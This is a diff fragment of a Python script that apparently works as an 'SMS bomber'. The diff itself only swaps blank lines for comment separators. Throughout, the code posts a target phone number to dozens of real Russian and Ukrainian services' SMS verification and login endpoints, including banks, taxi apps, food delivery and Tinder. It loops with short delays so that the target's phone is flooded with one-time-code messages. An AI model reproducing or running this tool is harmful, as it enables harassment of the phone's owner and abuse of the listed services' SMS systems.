                     "https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}
@@ -1842,7 +1844,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.pozichka.ua/v1/registration/send",
@@ -1855,7 +1857,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ontaxi.com.ua/api/v2/web/client",
@@ -1868,7 +1870,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://suandshi.ru/mobile_api/register_mobile_user",
@@ -1881,7 +1883,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
@@ -1894,7 +1896,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
@@ -1907,7 +1909,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -1920,7 +1922,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://belkacar.ru/get-confirmation-code",
@@ -1935,7 +1937,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://starpizzacafe.com/mods/a.function.php",
@@ -1948,7 +1950,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -1962,7 +1964,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/",
@@ -1976,7 +1978,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.tinkoff.ru/v1/sign_up",
@@ -1990,7 +1992,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://dostavista.ru/backend/send-verification-sms",
@@ -2003,7 +2005,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.monobank.com.ua/api/mobapplink/send",
@@ -2016,6 +2018,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}",
@@ -2028,7 +2031,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
                 kk = kk + 1
@@ -2038,7 +2041,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://koronapay.com/transfers/online/api/users/otps",
@@ -2051,7 +2054,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://btfair.site/api/user/phone/code",
@@ -2064,7 +2067,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ggbet.ru/api/auth/register-with-phone",
@@ -2083,7 +2086,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.etm.ru/cat/runprog.html",
@@ -2101,7 +2104,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
@@ -2113,7 +2116,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
@@ -2125,7 +2128,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://account.my.games/signup_send_sms/", data={"phone": _phone}
@@ -2137,7 +2140,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://zoloto585.ru/api/bcard/reg/",
@@ -2159,7 +2162,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                 kk = kk + 1
@@ -2169,7 +2172,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cloud.mail.ru/api/v2/notify/applink",
@@ -2188,7 +2191,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.creditter.ru/confirm/sms/send",
@@ -2201,7 +2204,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
@@ -2228,7 +2231,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://win.1admiralxxx.ru/api/en/register.json",
@@ -2249,7 +2252,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://oauth.av.ru/check-phone",
@@ -2262,7 +2265,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -2275,7 +2278,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://city24.ua/personalaccount/account/registration",
@@ -2288,7 +2291,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://client-api.sushi-master.ru/api/v1/auth/init",
@@ -2301,7 +2304,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                 kk = kk + 1
@@ -2311,7 +2314,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.niyama.ru/ajax/sendSMS.php",
@@ -2328,7 +2331,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
@@ -2340,7 +2343,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.easypay.ua/api/auth/register",
@@ -2353,7 +2356,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://fix-price.ru/ajax/register_phone_code.php",
@@ -2370,7 +2373,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.nl.ua",
@@ -2389,7 +2392,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://msk.tele2.ru/api/validation/number/" + _phone,
@@ -2402,7 +2405,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.finam.ru/api/smslocker/sendcode",
@@ -2415,7 +2418,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://makimaki.ru/system/callback.php",
@@ -2431,7 +2434,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/6/user/signup/status",
@@ -2448,7 +2451,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secure.online.ua/ajax/check_phone/",
@@ -2461,7 +2464,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cabinet.planetakino.ua/service/sms",
@@ -2474,7 +2477,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ontaxi.com.ua/api/v2/web/client",
@@ -2487,7 +2490,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -2500,7 +2503,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://smart.space/api/users/request_confirmation_code/",
@@ -2513,7 +2516,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -2526,7 +2529,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
@@ -2544,7 +2547,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://apteka.ru/_action/auth/getForm/",
@@ -2569,7 +2572,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://uklon.com.ua/api/v1/account/code/send",
@@ -2583,7 +2586,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
@@ -2596,7 +2599,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://requests.service.banki.ru/form/960/submit",
@@ -2616,7 +2619,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -2629,7 +2632,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -2642,7 +2645,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://helsi.me/api/healthy/accounts/login",
@@ -2655,7 +2658,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.kinoland.com.ua/api/v1/service/send-sms",
@@ -2669,7 +2672,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pizzahut.ru/account/password-reset",
@@ -2687,7 +2690,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.rabota.ru/remind", data={"credential": _phone}
@@ -2699,7 +2702,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://rutube.ru/api/accounts/sendpass/phone",
@@ -2712,7 +2715,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.citilink.ru/registration/confirm/phone/+"
@@ -2726,7 +2729,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
@@ -2739,7 +2742,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.oyorooms.com/api/pwa/generateotp?phone="
@@ -2753,7 +2756,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
@@ -2771,7 +2774,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://newnext.ru/graphql",
@@ -2797,7 +2800,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.sunlight.net/v3/customers/authorization/",
@@ -2810,7 +2813,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -2828,7 +2831,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
@@ -2841,7 +2844,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://online.sbis.ru/reg/service/",
@@ -2860,7 +2863,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
@@ -2885,7 +2888,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
@@ -2898,7 +2901,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
@@ -2910,7 +2913,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -2923,7 +2926,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
@@ -2935,7 +2938,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -2948,7 +2951,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.delitime.ru/api/v2/signup",
@@ -2961,7 +2964,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://findclone.ru/register", params={"phone": "+" + _phone}
@@ -2973,7 +2976,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://guru.taxi/api/v1/driver/session/verify",
@@ -2986,7 +2989,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -3006,7 +3009,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -3028,7 +3031,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -3045,7 +3048,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -3058,6 +3061,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -3070,7 +3074,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lenta.com/api/v1/authentication/requestValidationCode",
@@ -3083,7 +3087,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cloud.mail.ru/api/v2/notify/applink",
@@ -3101,7 +3105,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
@@ -3119,7 +3123,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -3132,7 +3136,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
@@ -3145,7 +3149,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://sso.cloud.qlean.ru/http/users/requestotp",
@@ -3165,7 +3169,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                 kk = kk + 1
@@ -3175,6 +3179,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -3187,7 +3192,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://passport.twitch.tv/register?trusted_request=true",
@@ -3207,7 +3212,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cabinet.wi-fi.ru/api/auth/by-sms",
@@ -3221,7 +3226,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.wowworks.ru/v2/site/send-code",
@@ -3234,7 +3239,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://eda.yandex/api/v1/user/request_authentication_code",
@@ -3247,7 +3252,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
@@ -3259,7 +3264,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -3277,7 +3282,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
@@ -3290,6 +3295,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone}
@@ -3301,7 +3307,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
@@ -3313,7 +3319,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.citrus.ua/api/v2/register",
@@ -3332,7 +3338,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}
@@ -3344,7 +3350,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
@@ -3361,7 +3367,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -3374,7 +3380,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://comfy.ua/ua/customer/account/createPost",
@@ -3391,7 +3397,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
@@ -3404,7 +3410,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cinema5.ru/api/phone_code", data={"phone": _phonePizzahut}
@@ -3416,7 +3422,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.etm.ru/cat/runprog.html",
@@ -3434,7 +3440,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://apteka.ru/_action/auth/getForm/",
@@ -3459,7 +3465,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -3472,7 +3478,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secunda.com.ua/personalarea/registrationvalidphone",
@@ -3485,7 +3491,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}
@@ -3497,7 +3503,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -3510,6 +3516,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
@@ -3522,7 +3529,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.iconjob.co/api/auth/verification_code",
@@ -3535,7 +3542,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://panda99.ru/bdhandlers/order.php?t={int(time())}",
@@ -3548,7 +3555,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://auth.pizza33.ua/ua/join/check/",
@@ -3570,7 +3577,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
@@ -3582,7 +3589,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
